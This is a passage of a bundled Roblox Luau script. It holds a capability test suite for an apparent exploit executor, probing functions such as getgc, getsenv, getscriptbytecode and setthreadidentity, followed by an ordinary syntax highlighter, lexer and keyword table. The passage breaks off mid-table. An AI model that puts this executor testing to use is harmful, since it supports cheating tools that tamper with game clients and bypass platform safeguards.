		assert(type(data) == "table" and type(data["user-agent"]) == "string", "Did not return a table with a user-agent key")
		return "User-Agent: " .. data["user-agent"]
	end)

	test("setclipboard", {"toclipboard"})

	test("setfpscap", {}, function()
		local renderStepped = game:GetService("RunService").RenderStepped
		local function step()
			renderStepped:Wait()
			local sum = 0
			for _ = 1, 5 do
				sum += 1 / renderStepped:Wait()
			end
			return math.round(sum / 5)
		end
		setfpscap(60)
		local step60 = step()
		setfpscap(0)
		local step0 = step()
		return step60 .. "fps @60 • " .. step0 .. "fps @0"
	end)

	-- Scripts

	test("getgc", {}, function()
		local gc = getgc()
		assert(type(gc) == "table", "Did not return a table")
		assert(#gc > 0, "Did not return a table with any values")
	end)

	test("getgenv", {}, function()
		getgenv().__TEST_GLOBAL = true
		assert(__TEST_GLOBAL, "Failed to set a global variable")
		getgenv().__TEST_GLOBAL = nil
	end)

	test("getloadedmodules", {}, function()
		local modules = getloadedmodules()
		assert(type(modules) == "table", "Did not return a table")
		assert(#modules > 0, "Did not return a table with any values")
		assert(typeof(modules[1]) == "Instance", "First value is not an Instance")
		assert(modules[1]:IsA("ModuleScript"), "First value is not a ModuleScript")
	end)

	test("getrenv", {}, function()
		assert(_G ~= getrenv()._G, "The variable _G in the executor is identical to _G in the game")
	end)

	test("getrunningscripts", {}, function()
		local scripts = getrunningscripts()
		assert(type(scripts) == "table", "Did not return a table")
		assert(#scripts > 0, "Did not return a table with any values")
		assert(typeof(scripts[1]) == "Instance", "First value is not an Instance")
		assert(scripts[1]:IsA("ModuleScript") or scripts[1]:IsA("LocalScript"), "First value is not a ModuleScript or LocalScript")
	end)

	test("getscriptbytecode", {"dumpstring"}, function()
		local animate = game:GetService("Players").LocalPlayer.Character.Animate
		local bytecode = getscriptbytecode(animate)
		assert(type(bytecode) == "string", "Did not return a string for Character.Animate (a " .. animate.ClassName .. ")")
	end)

	test("getscripthash", {}, function()
		local animate = game:GetService("Players").LocalPlayer.Character.Animate:Clone()
		local hash = getscripthash(animate)
		local source = animate.Source
		animate.Source = "print('Hello, world!')"
		task.defer(function()
			animate.Source = source
		end)
		local newHash = getscripthash(animate)
		assert(hash ~= newHash, "Did not return a different hash for a modified script")
		assert(newHash == getscripthash(animate), "Did not return the same hash for a script with the same source")
	end)

	test("getscripts", {}, function()
		local scripts = getscripts()
		assert(type(scripts) == "table", "Did not return a table")
		assert(#scripts > 0, "Did not return a table with any values")
		assert(typeof(scripts[1]) == "Instance", "First value is not an Instance")
		assert(scripts[1]:IsA("ModuleScript") or scripts[1]:IsA("LocalScript"), "First value is not a ModuleScript or LocalScript")
	end)

	test("getsenv", {}, function()
		local animate = game:GetService("Players").LocalPlayer.Character.Animate
		local env = getsenv(animate)
		assert(type(env) == "table", "Did not return a table for Character.Animate (a " .. animate.ClassName .. ")")
		assert(env.script == animate, "The script global is not identical to Character.Animate")
	end)

	test("getthreadidentity", {"getidentity", "getthreadcontext"}, function()
		assert(type(getthreadidentity()) == "number", "Did not return a number")
	end)

	test("setthreadidentity", {"setidentity", "setthreadcontext"}, function()
		setthreadidentity(3)
		assert(getthreadidentity() == 3, "Did not set the thread identity")
	end)

	-- Drawing

	test("Drawing", {})

	test("Drawing.new", {}, function()
		local drawing = Drawing.new("Square")
		drawing.Visible = false
		local canDestroy = pcall(function()
			drawing:Destroy()
		end)
		assert(canDestroy, "Drawing:Destroy() should not throw an error")
	end)

	test("Drawing.Fonts", {}, function()
		assert(Drawing.Fonts.UI == 0, "Did not return the correct id for UI")
		assert(Drawing.Fonts.System == 1, "Did not return the correct id for System")
		assert(Drawing.Fonts.Plex == 2, "Did not return the correct id for Plex")
		assert(Drawing.Fonts.Monospace == 3, "Did not return the correct id for Monospace")
	end)

	test("isrenderobj", {}, function()
		local drawing = Drawing.new("Image")
		drawing.Visible = true
		assert(isrenderobj(drawing) == true, "Did not return true for an Image")
		assert(isrenderobj(newproxy()) == false, "Did not return false for a blank table")
	end)

	test("getrenderproperty", {}, function()
		local drawing = Drawing.new("Image")
		drawing.Visible = true
		assert(type(getrenderproperty(drawing, "Visible")) == "boolean", "Did not return a boolean value for Image.Visible")
		local success, result = pcall(function()
			return getrenderproperty(drawing, "Color")
		end)
		if not success or not result then
			return "Image.Color is not supported"
		end
	end)

	test("setrenderproperty", {}, function()
		local drawing = Drawing.new("Square")
		drawing.Visible = true
		setrenderproperty(drawing, "Visible", false)
		assert(drawing.Visible == false, "Did not set the value for Square.Visible")
	end)

	test("cleardrawcache", {}, function()
		cleardrawcache()
	end)

	-- WebSocket

	test("WebSocket", {})

	test("WebSocket.connect", {}, function()
		local types = {
			Send = "function",
			Close = "function",
			OnMessage = {"table", "userdata"},
			OnClose = {"table", "userdata"},
		}
		local ws = WebSocket.connect("ws://echo.websocket.events")
		assert(type(ws) == "table" or type(ws) == "userdata", "Did not return a table or userdata")
		for k, v in pairs(types) do
			if type(v) == "table" then
				assert(table.find(v, type(ws[k])), "Did not return a " .. table.concat(v, ", ") .. " for " .. k .. " (a " .. type(ws[k]) .. ")")
			else
				assert(type(ws[k]) == v, "Did not return a " .. v .. " for " .. k .. " (a " .. type(ws[k]) .. ")")
			end
		end
		ws:Close()
	end)
end

return mod
end;
};
G2L_MODULES[G2L["48"]] = {
Closure = function()
    local script = G2L["48"];local types = require(script.types)
local utility = require(script.utility)
local theme = require(script.theme)

local Highlighter = {
	defaultLexer = require(script.lexer) :: types.Lexer,

	_textObjectData = {} :: { [types.TextObject]: types.ObjectData },
	_cleanups = {} :: { [types.TextObject]: () -> () },
}

--[[
	Gathers the info that is needed in order to set up a line label.
]]
function Highlighter._getLabelingInfo(textObject: types.TextObject)
	local data = Highlighter._textObjectData[textObject]
	if not data then
		return
	end

	local src = utility.convertTabsToSpaces(utility.removeControlChars(textObject.Text))
	local numLines = #string.split(src, "\n")
	if numLines == 0 then
		return
	end

	local textBounds = utility.getTextBounds(textObject)
	local textHeight = textBounds.Y / numLines

	return {
		data = data,
		numLines = numLines,
		textBounds = textBounds,
		textHeight = textHeight,
		innerAbsoluteSize = utility.getInnerAbsoluteSize(textObject),
		textColor = theme.getColor("iden"),
		textFont = textObject.FontFace,
		textSize = textObject.TextSize,
		labelSize = UDim2.new(1, 0, 0, math.ceil(textHeight)),
	}
end

--[[
	Aligns and matches the line labels to the textObject.
]]
function Highlighter._alignLabels(textObject: types.TextObject)
	local labelingInfo = Highlighter._getLabelingInfo(textObject)
	if not labelingInfo then
		return
	end

	for lineNumber, lineLabel in labelingInfo.data.Labels do
		-- Align line label
		lineLabel.TextColor3 = labelingInfo.textColor
		lineLabel.FontFace = labelingInfo.textFont
		lineLabel.TextSize = labelingInfo.textSize
		lineLabel.Size = labelingInfo.labelSize
		lineLabel.Position =
			UDim2.fromScale(0, labelingInfo.textHeight * (lineNumber - 1) / labelingInfo.innerAbsoluteSize.Y)
	end
end

--[[
	Creates and populates the line labels with the appropriate rich text.
]]
function Highlighter._populateLabels(props: types.HighlightProps)
	-- Gather props
	local textObject = props.textObject
	local src = utility.convertTabsToSpaces(utility.removeControlChars(props.src or textObject.Text))
	local lexer = props.lexer or Highlighter.defaultLexer
	local customLang = props.customLang
	local forceUpdate = props.forceUpdate

	-- Avoid updating when unnecessary
	local data = Highlighter._textObjectData[textObject]
	if (data == nil) or (data.Text == src) then
		if forceUpdate ~= true then
			return
		end
	end

	-- Ensure textObject matches sanitized src
	textObject.Text = src

	local lineLabels = data.Labels
	local previousLines = data.Lines

	local lines = string.split(src, "\n")

	data.Lines = lines
	data.Text = src
	data.Lexer = lexer
	data.CustomLang = customLang

	-- Shortcut empty textObjects
	if src == "" then
		for l = 1, #lineLabels do
			if lineLabels[l].Text == "" then
				continue
			end
			lineLabels[l].Text = ""
		end
		return
	end

	local idenColor = theme.getColor("iden")
	local labelingInfo = Highlighter._getLabelingInfo(textObject)

	local richTextBuffer, bufferIndex, lineNumber = table.create(5), 0, 1
	for token: types.TokenName, content: string in lexer.scan(src) do
		local Color = if customLang and customLang[content]
			then theme.getColor("custom")
			else theme.getColor(token) or idenColor

		local tokenLines = string.split(utility.sanitizeRichText(content), "\n")

		for l, tokenLine in tokenLines do
			-- Find line label
			local lineLabel = lineLabels[lineNumber]
			if not lineLabel then
				local newLabel = Instance.new("TextLabel")
				newLabel.Name = "Line_" .. lineNumber
				newLabel.AutoLocalize = false
				newLabel.RichText = true
				newLabel.BackgroundTransparency = 1
				newLabel.Text = ""
				newLabel.TextXAlignment = Enum.TextXAlignment.Left
				newLabel.TextYAlignment = Enum.TextYAlignment.Top
				newLabel.TextColor3 = labelingInfo.textColor
				newLabel.FontFace = labelingInfo.textFont
				newLabel.TextSize = labelingInfo.textSize
				newLabel.Size = labelingInfo.labelSize
				newLabel.Position =
					UDim2.fromScale(0, labelingInfo.textHeight * (lineNumber - 1) / labelingInfo.innerAbsoluteSize.Y)

				newLabel.Parent = textObject.SyntaxHighlights
				lineLabels[lineNumber] = newLabel
				lineLabel = newLabel
			end

			-- If multiline token, then set line & move to next
			if l > 1 then
				if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
					-- Set line
					lineLabels[lineNumber].Text = table.concat(richTextBuffer)
				end
				-- Move to next line
				lineNumber += 1
				bufferIndex = 0
				table.clear(richTextBuffer)
			end

			-- If changed, add token to line
			if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
				bufferIndex += 1
				-- Only add RichText tags when the color is non-default and the characters are non-whitespace
				if Color ~= idenColor and string.find(tokenLine, "[%S%C]") then
					richTextBuffer[bufferIndex] = theme.getColoredRichText(Color, tokenLine)
				else
					richTextBuffer[bufferIndex] = tokenLine
				end
			end
		end
	end

	-- Set final line
	if richTextBuffer[1] and lineLabels[lineNumber] then
		lineLabels[lineNumber].Text = table.concat(richTextBuffer)
	end

	-- Clear unused line labels
	for l = lineNumber + 1, #lineLabels do
		if lineLabels[l].Text == "" then
			continue
		end
		lineLabels[l].Text = ""
	end
end

--[[
	Builds rich text lines from the given source code.
	Useful for cases where you want to render the labels yourself for something.
]]
function Highlighter.buildRichTextLines(props: types.BuildRichTextLinesProps): { string }
	-- Gather props
	local src = utility.convertTabsToSpaces(utility.removeControlChars(props.src))
	local lexer = props.lexer or Highlighter.defaultLexer
	local customLang = props.customLang
	local idenColor = theme.getColor("iden")

	local richTextLines = table.create(select(2, string.gsub(src, "\n", "\n")) + 1)
	local richTextBuffer, bufferIndex = table.create(5), 0
	local lineNumber = 1

	for token: types.TokenName, content: string in lexer.scan(src) do
		local Color = if customLang and customLang[content]
			then theme.getColor("custom")
			else theme.getColor(token) or idenColor

		local tokenLines = string.split(utility.sanitizeRichText(content), "\n")

		for l, tokenLine in tokenLines do
			-- If multiline token, then set line & move to next
			if l > 1 then
				-- Set line
				richTextLines[lineNumber] = table.concat(richTextBuffer)
				-- Move to next line
				lineNumber += 1
				bufferIndex = 0
				table.clear(richTextBuffer)
			end

			bufferIndex += 1
			-- Only add RichText tags when the characters are non-whitespace
			if string.find(tokenLine, "[%S%C]") then
				richTextBuffer[bufferIndex] = theme.getColoredRichText(Color, tokenLine)
			else
				richTextBuffer[bufferIndex] = tokenLine
			end
		end
	end

	-- Set final line
	richTextLines[lineNumber] = table.concat(richTextBuffer)

	return richTextLines
end

--[[
	Highlights the given textObject with the given props and returns a cleanup function.
	Highlighting will automatically update when needed, so the cleanup function will disconnect
	those connections and remove all labels.
]]
function Highlighter.highlight(props: types.HighlightProps): () -> ()
	-- Gather props
	local textObject = props.textObject
	local src = utility.convertTabsToSpaces(utility.removeControlChars(props.src or textObject.Text))
	local lexer = props.lexer or Highlighter.defaultLexer
	local customLang = props.customLang

	-- Avoid updating when unnecessary
	if Highlighter._cleanups[textObject] then
		-- Already been initialized, so just update
		Highlighter._populateLabels(props)
		Highlighter._alignLabels(textObject)
		return Highlighter._cleanups[textObject]
	end

	-- Ensure valid object properties
	textObject.RichText = false
	textObject.Text = src
	textObject.TextXAlignment = Enum.TextXAlignment.Left
	textObject.TextYAlignment = Enum.TextYAlignment.Top
	textObject.BackgroundColor3 = theme.getColor("background")
	textObject.TextColor3 = theme.getColor("iden")
	textObject.TextTransparency = 0.5

	-- Build the highlight labels
	local lineFolder = textObject:FindFirstChild("SyntaxHighlights")
	if lineFolder == nil then
		local newLineFolder = Instance.new("Folder")
		newLineFolder.Name = "SyntaxHighlights"
		newLineFolder.Parent = textObject

		lineFolder = newLineFolder
	end

	local data = {
		Text = "",
		Labels = {},
		Lines = {},
		Lexer = lexer,
		CustomLang = customLang,
	}
	Highlighter._textObjectData[textObject] = data

	-- Add a cleanup handler for this textObject
	local connections: { [string]: RBXScriptConnection } = {}
	local function cleanup()
		lineFolder:Destroy()

		Highlighter._textObjectData[textObject] = nil
		Highlighter._cleanups[textObject] = nil

		for _key, connection in connections do
			connection:Disconnect()
		end
		table.clear(connections)
	end
	Highlighter._cleanups[textObject] = cleanup

	connections["AncestryChanged"] = textObject.AncestryChanged:Connect(function()
		if textObject.Parent then
			return
		end

		cleanup()
	end)
	connections["TextChanged"] = textObject:GetPropertyChangedSignal("Text"):Connect(function()
		Highlighter._populateLabels(props)
	end)
	connections["TextBoundsChanged"] = textObject:GetPropertyChangedSignal("TextBounds"):Connect(function()
		Highlighter._alignLabels(textObject)
	end)
	local RunService = game:GetService("RunService")
	connections["AbsoluteSizeChanged"] = textObject:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
		RunService.Heartbeat:Wait()
		Highlighter._alignLabels(textObject)
	end)

	connections["FontFaceChanged"] = textObject:GetPropertyChangedSignal("FontFace"):Connect(function()
		Highlighter._alignLabels(textObject)
	end)

	-- Populate the labels
	Highlighter._populateLabels(props)
	Highlighter._alignLabels(textObject)

	return cleanup
end

--[[
	Refreshes all highlighted textObjects. Used when the theme changes.
]]
function Highlighter.refresh(): ()
	-- Rehighlight existing labels using latest colors
	for textObject, data in Highlighter._textObjectData do
		for _, lineLabel in data.Labels do
			lineLabel.TextColor3 = theme.getColor("iden")
		end

		Highlighter.highlight({
			textObject = textObject,
			forceUpdate = true,
			src = data.Text,
			lexer = data.Lexer,
			customLang = data.CustomLang,
		})
	end
end

--[[
	Sets the token colors to the given colors and refreshes all highlighted textObjects.
]]
function Highlighter.setTokenColors(colors: types.TokenColors): ()
	theme.setColors(colors)

	Highlighter.refresh()
end

--[[
	Gets a token color by name.
	Mainly useful for setting "background" token color on other UI objects behind your text.
]]
function Highlighter.getTokenColor(tokenName: types.TokenName): Color3
	return theme.getColor(tokenName)
end

--[[
	Matches the token colors to the Studio theme settings and refreshes all highlighted textObjects.
	Does nothing when not run in a Studio plugin.
]]
function Highlighter.matchStudioSettings(): ()
	local applied = theme.matchStudioSettings(Highlighter.refresh)
	if applied then
		Highlighter.refresh()
	end
end

return Highlighter

end;
};
G2L_MODULES[G2L["49"]] = {
Closure = function()
    local script = G2L["49"];--[=[
	Lexical scanner for creating a sequence of tokens from Lua source code.
	This is a heavily modified and Roblox-optimized version of
	the original Penlight Lexer module:
		https://github.com/stevedonovan/Penlight
	Authors:
		stevedonovan <https://github.com/stevedonovan> ----------- Original Penlight lexer author
		ryanjmulder <https://github.com/ryanjmulder> ------------- Penlight lexer contributer
		mpeterv <https://github.com/mpeterv> --------------------- Penlight lexer contributer
		Tieske <https://github.com/Tieske> ----------------------- Penlight lexer contributer
		boatbomber <https://github.com/boatbomber> --------------- Roblox port, added builtin token,
		                                                           added patterns for incomplete syntax, bug fixes,
		                                                           behavior changes, token optimization, thread optimization
		                                                           Added lexer.navigator() for non-sequential reads
		Sleitnick <https://github.com/Sleitnick> ----------------- Roblox optimizations
		howmanysmall <https://github.com/howmanysmall> ----------- Lua + Roblox optimizations

	List of possible tokens:
		- iden
		- keyword
		- builtin
		- string
		- number
		- comment
		- operator
--]=]

local lexer = {}

local Prefix, Suffix, Cleaner = "^[%c%s]*", "[%c%s]*", "[%c%s]+"
local UNICODE = "[%z\x01-\x7F\xC2-\xF4][\x80-\xBF]+"
local NUMBER_A = "0[xX][%da-fA-F_]+"
local NUMBER_B = "0[bB][01_]+"
local NUMBER_C = "%d+%.?%d*[eE][%+%-]?%d+"
local NUMBER_D = "%d+[%._]?[%d_eE]*"
local OPERATORS = "[:;<>/~%*%(%)%-={},%.#%^%+%%]+"
local BRACKETS = "[%[%]]+" -- needs to be separate pattern from other operators or it'll mess up multiline strings
local IDEN = "[%a_][%w_]*"
local STRING_EMPTY = "(['\"])%1" --Empty String
local STRING_PLAIN = "(['\"])[^\n]-([^\\]%1)" --TODO: Handle escaping escapes
local STRING_INTER = "`[^\n]-`"
local STRING_INCOMP_A = "(['\"]).-\n" --Incompleted String with next line
local STRING_INCOMP_B = "(['\"])[^\n]*" --Incompleted String without next line
local STRING_MULTI = "%[(=*)%[.-%]%1%]" --Multiline-String
local STRING_MULTI_INCOMP = "%[=*%[.-.*" --Incompleted Multiline-String
local COMMENT_MULTI = "%-%-%[(=*)%[.-%]%1%]" --Completed Multiline-Comment
local COMMENT_MULTI_INCOMP = "%-%-%[=*%[.-.*" --Incompleted Multiline-Comment
local COMMENT_PLAIN = "%-%-.-\n" --Completed Singleline-Comment
local COMMENT_INCOMP = "%-%-.*" --Incompleted Singleline-Comment
-- local TYPED_VAR = ":%s*([%w%?%| \t]+%s*)" --Typed variable, parameter, function

local lang = require(script.language)
local lua_keyword = lang.keyword
local lua_builtin = lang.builtin
local lua_libraries = lang.libraries

lexer.language = lang

local lua_matches = {
	-- Indentifiers
	{ Prefix .. IDEN .. Suffix, "var" },

	-- Numbers
	{ Prefix .. NUMBER_A .. Suffix, "number" },
	{ Prefix .. NUMBER_B .. Suffix, "number" },
	{ Prefix .. NUMBER_C .. Suffix, "number" },
	{ Prefix .. NUMBER_D .. Suffix, "number" },

	-- Strings
	{ Prefix .. STRING_EMPTY .. Suffix, "string" },
	{ Prefix .. STRING_PLAIN .. Suffix, "string" },
	{ Prefix .. STRING_INCOMP_A .. Suffix, "string" },
	{ Prefix .. STRING_INCOMP_B .. Suffix, "string" },
	{ Prefix .. STRING_MULTI .. Suffix, "string" },
	{ Prefix .. STRING_MULTI_INCOMP .. Suffix, "string" },
	{ Prefix .. STRING_INTER .. Suffix, "string_inter" },

	-- Comments
	{ Prefix .. COMMENT_MULTI .. Suffix, "comment" },
	{ Prefix .. COMMENT_MULTI_INCOMP .. Suffix, "comment" },
	{ Prefix .. COMMENT_PLAIN .. Suffix, "comment" },
	{ Prefix .. COMMENT_INCOMP .. Suffix, "comment" },

	-- Operators
	{ Prefix .. OPERATORS .. Suffix, "operator" },
	{ Prefix .. BRACKETS .. Suffix, "operator" },

	-- Unicode
	{ Prefix .. UNICODE .. Suffix, "iden" },

	-- Unknown
	{ "^.", "iden" },
}

-- To reduce the amount of table indexing during lexing, we separate the matches now
local PATTERNS, TOKENS = {}, {}
for i, m in lua_matches do
	PATTERNS[i] = m[1]
	TOKENS[i] = m[2]
end

--- Create a plain token iterator from a string.
-- @tparam string s a string.

function lexer.scan(s: string)
	local index = 1
	local size = #s
	local previousContent1, previousContent2, previousContent3, previousToken = "", "", "", ""

	local thread = coroutine.create(function()
		while index <= size do
			local matched = false
			for tokenType, pattern in ipairs(PATTERNS) do
				-- Find match
				local start, finish = string.find(s, pattern, index)
				if start == nil then
					continue
				end

				-- Move head
				index = finish + 1
				matched = true

				-- Gather results
				local content = string.sub(s, start, finish)
				local rawToken = TOKENS[tokenType]
				local processedToken = rawToken

				-- Process token
				if rawToken == "var" then
					-- Since we merge spaces into the tok, we need to remove them
					-- in order to check the actual word it contains
					local cleanContent = string.gsub(content, Cleaner, "")

					if lua_keyword[cleanContent] then
						processedToken = "keyword"
					elseif lua_builtin[cleanContent] then
						processedToken = "builtin"
					elseif string.find(previousContent1, "%.[%s%c]*$") and previousToken ~= "comment" then
						-- The previous was a . so we need to special case indexing things
						local parent = string.gsub(previousContent2, Cleaner, "")
						local lib = lua_libraries[parent]
						if lib and lib[cleanContent] and not string.find(previousContent3, "%.[%s%c]*$") then
							-- Indexing a builtin lib with existing item, treat as a builtin
							processedToken = "builtin"
						else
							-- Indexing a non builtin, can't be treated as a keyword/builtin
							processedToken = "iden"
						end
						-- print("indexing",parent,"with",cleanTok,"as",t2)
					else
						processedToken = "iden"
					end
				elseif rawToken == "string_inter" then
					if not string.find(content, "[^\\]{") then
						-- This inter string doesnt actually have any inters
						processedToken = "string"
					else
						-- We're gonna do our own yields, so the main loop won't need to
						-- Our yields will be a mix of string and whatever is inside the inters
						processedToken = nil

						local isString = true
						local subIndex = 1
						local subSize = #content
						while subIndex <= subSize do
							-- Find next brace
							local subStart, subFinish = string.find(content, "^.-[^\\][{}]", subIndex)
							if subStart == nil then
								-- No more braces, all string
								coroutine.yield("string", string.sub(content, subIndex))
								break
							end

							if isString then
								-- We are currently a string
								subIndex = subFinish + 1
								coroutine.yield("string", string.sub(content, subStart, subFinish))

								-- This brace opens code
								isString = false
							else
								-- We are currently in code
								subIndex = subFinish
								local subContent = string.sub(content, subStart, subFinish - 1)
								for innerToken, innerContent in lexer.scan(subContent) do
									coroutine.yield(innerToken, innerContent)
								end

								-- This brace opens string/closes code
								isString = true
							end
						end
					end
				end

				-- Record last 3 tokens for the indexing context check
				previousContent3 = previousContent2
				previousContent2 = previousContent1
				previousContent1 = content
				previousToken = processedToken or rawToken
				if processedToken then
					coroutine.yield(processedToken, content)
				end
				break
			end

			-- No matches found
			if not matched then
				return
			end
		end

		-- Completed the scan
		return
	end)

	return function()
		if coroutine.status(thread) == "dead" then
			return
		end

		local success, token, content = coroutine.resume(thread)
		if success and token then
			return token, content
		end

		return
	end
end

function lexer.navigator()
	local nav = {
		Source = "",
		TokenCache = table.create(50),

		_RealIndex = 0,
		_UserIndex = 0,
		_ScanThread = nil,
	}

	function nav:Destroy()
		self.Source = nil
		self._RealIndex = nil
		self._UserIndex = nil
		self.TokenCache = nil
		self._ScanThread = nil
	end

	function nav:SetSource(SourceString)
		self.Source = SourceString

		self._RealIndex = 0
		self._UserIndex = 0
		table.clear(self.TokenCache)

		self._ScanThread = coroutine.create(function()
			for Token, Src in lexer.scan(self.Source) do
				self._RealIndex += 1
				self.TokenCache[self._RealIndex] = { Token, Src }
				coroutine.yield(Token, Src)
			end
		end)
	end

	function nav.Next()
		nav._UserIndex += 1

		if nav._RealIndex >= nav._UserIndex then
			-- Already scanned, return cached
			return table.unpack(nav.TokenCache[nav._UserIndex])
		else
			if coroutine.status(nav._ScanThread) == "dead" then
				-- Scan thread dead
				return
			else
				local success, token, src = coroutine.resume(nav._ScanThread)
				if success and token then
					-- Scanned new data
					return token, src
				else
					-- Lex completed
					return
				end
			end
		end
	end

	function nav.Peek(PeekAmount)
		local GoalIndex = nav._UserIndex + PeekAmount

		if nav._RealIndex >= GoalIndex then
			-- Already scanned, return cached
			if GoalIndex > 0 then
				return table.unpack(nav.TokenCache[GoalIndex])
			else
				-- Invalid peek
				return
			end
		else
			if coroutine.status(nav._ScanThread) == "dead" then
				-- Scan thread dead
				return
			else
				local IterationsAway = GoalIndex - nav._RealIndex

				local success, token, src = nil, nil, nil

				for _ = 1, IterationsAway do
					success, token, src = coroutine.resume(nav._ScanThread)
					if not (success or token) then
						-- Lex completed
						break
					end
				end

				return token, src
			end
		end
	end

	return nav
end

return lexer

end;
};
G2L_MODULES[G2L["4a"]] = {
Closure = function()
    local script = G2L["4a"];local language = {
	keyword = {
		["and"] = "keyword",
		["break"] = "keyword",
		["continue"] = "keyword",
		["do"] = "keyword",
		["else"] = "keyword",
		["elseif"] = "keyword",
		["end"] = "keyword",
		["export"] = "keyword",
		["false"] = "keyword",
		["for"] = "keyword",
		["function"] = "keyword",
		["if"] = "keyword",
		["in"] = "keyword",
		["local"] = "keyword",
		["nil"] = "keyword",
		["not"] = "keyword",
		["or"] = "keyword",
		["repeat"] = "keyword",
		["return"] = "keyword",
		["self"] = "keyword",
		["then"] = "keyword",
		["true"] = "keyword",
		["type"] = "keyword",
		["typeof"] = "keyword",
		["until"] = "keyword",
		["while"] = "keyword",
	},

	builtin = {
		-- Luau Functions
		["assert"] = "function",
		["error"] = "function",
		["getfenv"] = "function",
		["getmetatable"] = "function",
		["ipairs"] = "function",
		["loadstring"] = "function",
		["newproxy"] = "function",
		["next"] = "function",
		["pairs"] = "function",
		["pcall"] = "function",
		["print"] = "function",
		["rawequal"] = "function",
		["rawget"] = "function",
		["rawlen"] = "function",
		["rawset"] = "function",
		["select"] = "function",
		["setfenv"] = "function",
		["setmetatable"] = "function",
		["tonumber"] = "function",
		["tostring"] = "function",
		["unpack"] = "function",
		["xpcall"] = "function",

		-- Luau Functions (Deprecated)
		["collectgarbage"] = "function",

		-- Luau Variables
		["_G"] = "table",
		["_VERSION"] = "string",

		-- Luau Tables
		["bit32"] = "table",
		["coroutine"] = "table",
		["debug"] = "table",
		["math"] = "table",
		["os"] = "table",
		["string"] = "table",
		["table"] = "table",
		["utf8"] = "table",

		-- Roblox Functions
		["DebuggerManager"] = "function",
		["delay"] = "function",
		["gcinfo"] = "function",
		["PluginManager"] = "function",
		["require"] = "function",
		["settings"] = "function",
		["spawn"] = "function",
		["tick"] = "function",
		["time"] = "function",
		["UserSettings"] = "function",
		["wait"] = "function",
		["warn"] = "function",

		-- Roblox Functions (Deprecated)
		["Delay"] = "function",
		["ElapsedTime"] = "function",
		["elapsedTime"] = "function",
		["printidentity"] = "function",
		["Spawn"] = "function",
		["Stats"] = "function",
		["stats"] = "function",
		["Version"] = "function",
		["version"] = "function",
		["Wait"] = "function",
		["ypcall"] = "function",

		-- Roblox Variables
		["game"] = "Instance",
		["plugin"] = "Instance",
		["script"] = "Instance",
		["shared"] = "Instance",
		["workspace"] = "Instance",

		-- Roblox Variables (Deprecated)
		["Game"] = "Instance",
		["Workspace"] = "Instance",

		-- Roblox Tables
		["Axes"] = "table",
		["BrickColor"] = "table",
		["CatalogSearchParams"] = "table",
		["CFrame"] = "table",
		["Color3"] = "table",
		["ColorSequence"] = "table",
		["ColorSequenceKeypoint"] = "table",
		["DateTime"] = "table",
		["DockWidgetPluginGuiInfo"] = "table",
		["Enum"] = "table",
		["Faces"] = "table",
		["FloatCurveKey"] = "table",
		["Font"] = "table",
		["Instance"] = "table",
		["NumberRange"] = "table",
		["NumberSequence"] = "table",
		["NumberSequenceKeypoint"] = "table",
		["OverlapParams"] = "table",
		["PathWaypoint"] = "table",
		["PhysicalProperties"] = "table",
		["Random"] = "table",
		["Ray"] = "table",
		["RaycastParams"] = "table",
		["Rect"] = "table",
		["Region3"] = "table",
		["Region3int16"] = "table",
		["RotationCurveKey"] = "table",
		["SharedTable"] = "table",
		["task"] = "table",
		["TweenInfo"] = "table",
		["UDim"] = "table",
		["UDim2"] = "table",
		["Vector2"] = "table",
		["Vector2int16"] = "table",
		["Vector3"] = "table",
		["Vector3int16"] = "table",
	},

	libraries = {

		-- Luau Libraries
		bit32 = {
			arshift = "function",
			band = "function",
			bnot = "function",
			bor = "function",
			btest = "function",
			bxor = "function",
			countlz = "function",
			countrz = "function",
			extract = "function",
			lrotate = "function",
			lshift = "function",
			replace = "function",
			rrotate = "function",
			rshift = "function",
		},

		buffer = {
			copy = "function",
			create = "function",
			fill = "function",
			fromstring = "function",
			len = "function",
			readf32 = "function",
			readf64 = "function",
			readi8 = "function",
			readi16 = "function",
			readi32 = "function",
			readu16 = "function",
			readu32 = "function",
			readu8 = "function",
			readstring = "function",
			tostring = "function",
			writef32 = "function",
			writef64 = "function",
			writei16 = "function",
			writei32 = "function",
			writei8 = "function",
			writestring = "function",
			writeu16 = "function",
			writeu32 = "function",
			writeu8 = "function",
		},

		coroutine = {
			close = "function",
			create = "function",
			isyieldable = "function",
			resume = "function",
			running = "function",
			status = "function",
			wrap = "function",
			yield = "function",
		},

		debug = {
			dumpheap = "function",
			getmemorycategory = "function",
			info = "function",
			loadmodule = "function",
			profilebegin = "function",
			profileend = "function",
			resetmemorycategory = "function",
			setmemorycategory = "function",
			traceback = "function",
		},

		math = {
			abs = "function",
			acos = "function",
			asin = "function",
			atan2 = "function",
			atan = "function",
			ceil = "function",
			clamp = "function",
			cos = "function",
			cosh = "function",
			deg = "function",
			exp = "function",
			floor = "function",
			fmod = "function",
			frexp = "function",
			ldexp = "function",
			log10 = "function",
			log = "function",
			max = "function",
			min = "function",
			modf = "function",
			noise = "function",
			pow = "function",
			rad = "function",
			random = "function",
			randomseed = "function",
			round = "function",
			sign = "function",
			sin = "function",
			sinh = "function",
			sqrt = "function",
			tan = "function",
			tanh = "function",

			huge = "number",
			pi = "number",
		},

		os = {
			clock = "function",
			date = "function",
			difftime = "function",
			time = "function",
		},

		string = {
			byte = "function",
			char = "function",
			find = "function",
			format = "function",
			gmatch = "function",
			gsub = "function",
			len = "function",
			lower = "function",
			match = "function",
			pack = "function",
			packsize = "function",
			rep = "function",
			reverse = "function",
			split = "function",
			sub = "function",
			unpack = "function",
			upper = "function",
		},

		table = {
			clear = "function",
			clone = "function",
			concat = "function",
			create = "function",
			find = "function",
			foreach = "function",
			foreachi = "function",
			freeze = "function",
			getn = "function",
			insert = "function",
			isfrozen = "function",
			maxn = "function",
			move = "function",
			pack = "function",
			remove = "function",
			sort = "function",
			unpack = "function",
		},

		utf8 = {
			char = "function",
			codepoint = "function",
			codes = "function",
			graphemes = "function",
			len = "function",
			nfcnormalize = "function",
			nfdnormalize = "function",
			offset = "function",

			charpattern = "string",
		},

		-- Roblox Libraries
		Axes = {
			new = "function",
		},

		BrickColor = {
			Black = "function",
			Blue = "function",
			DarkGray = "function",
			Gray = "function",
			Green = "function",
			new = "function",
			New = "function",
			palette = "function",
			Random = "function",
			random = "function",
			Red = "function",
			White = "function",
			Yellow = "function",
		},

		CatalogSearchParams = {
			new = "function",
		},

		CFrame = {
